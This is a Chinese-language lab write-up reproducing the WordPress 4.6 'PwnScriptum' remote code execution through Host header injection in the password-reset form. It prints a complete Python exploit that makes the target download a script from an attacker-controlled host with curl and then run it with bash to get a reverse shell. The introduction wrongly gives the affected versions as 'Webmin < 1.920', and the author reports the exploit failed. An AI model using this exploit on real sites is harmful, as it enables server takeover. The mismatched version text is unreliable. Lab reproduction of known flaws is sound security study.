

# WordPress 4.6远程执行代码漏洞（PwnScriptum）

###### by ADummy

### 0x00利用路线

​			burpuite抓包--->改包--->远程代码执行

### 0x01漏洞介绍

​			参考链接的有效负载不完整。深入阅读代码后，我发现只有在1.920之前不存在主体的用户参数时，才能执行命令，而在1.920处没有限制。

​			影响版本

  		Webmin < 1.920

### 0x02漏洞复现

​	访问`http://your-ip:8080/`，设置管理员用户名和密码以使用它（数据库已配置且不会自动更新）

我们需要满足以下要求才能利用此漏洞：

1. 执行的命令不能包含一些特殊的字符，例如`:`，`'`，`"`等。
2. 该命令将转换为小写字母
3. 该命令需要使用绝对路径
4. 需要知道一个现有的用户名

为了解决这些问题，漏洞作者提出了$`substr{0}{1}{$spool_directory}}`而不是`/`，使用`${substr{10}{1}{$tod_log} }`了替换空格的方法。

但是，仍然有很多字符无法使用。因此，我们需要将该命令放在第三方网站上，然后通过将其下载到`/tmp`目录中`curl -o /tmp/rce example.com/shell.sh`。

因此，展开过程如下：

1. 编写反向外壳的exp并将其放在站点上。exp具有以下要求：
   - 整个url的大写字母将转换为小写，因此文件路径不应包含大写字母。
   - 无法重定向对此页面的访问，因为跟随重定向的参数为`-L`（大写）。
2. 拼接命令`/usr/bin/curl -o/tmp/rce example.com/shell.sh`和`/bin/bash /tmp/rce`。
3. 将`/`命令中的空格和转换为`${substr{10}{1}{$tod_log}}`和`${substr{0}{1}{$spool_directory}}`。
4. 产生HTTP Host标头：`target(any -froot@localhost -be ${run{command}} null)`。
5. 依次发送这两个数据包。

这是[expliot.py](https://github.com/vulhub/vulhub/blob/master/wordpress/pwnscriptum/exploit.py)，更改`target`为目标站点，更改为[现有](https://github.com/vulhub/vulhub/blob/master/wordpress/pwnscriptum/exploit.py)`user`用户名，更改`shell_url`为有效负载站点。

exp

```
#!/usr/bin/env python3
import requests
import sys

# wordpress's url
target = 'http://192.168.0.142' if len(sys.argv) < 1 else sys.argv[1]
# Put your command in a website, and use the website's url
# don't contains "http://", must be all lowercase
shell_url = '192.168.0.141:8000/1.txt' if len(sys.argv) < 2 else sys.argv[2]
# an exists user
user = 'admin'

def generate_command(command):
    command = '${run{%s}}' % command
    command = command.replace('/', '${substr{0}{1}{$spool_directory}}')
    command = command.replace(' ', '${substr{10}{1}{$tod_log}}')
    return 'target(any -froot@localhost -be %s null)' % command


session = requests.session()
data = {
    'user_login': user,
    'redirect_to': '',
    'wp-submit': 'Get New Password'
}
session.headers = {
    'Host': generate_command('/usr/bin/curl -o/tmp/rce ' + shell_url),
    'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'
}
session.allow_redirects = False
target += '/wp-login.php?action=lostpassword'
session.post(target, data=data)

session.headers['Host'] = generate_command('/bin/bash /tmp/rce')
session.post(target, data=data)
```

![WordPress_远程执行代码漏洞_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/WordPress_远程执行代码漏洞_1.jpg)

![WordPress_远程执行代码漏洞_2](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/WordPress_远程执行代码漏洞_2.jpg)

exp总执行失败

未接到shell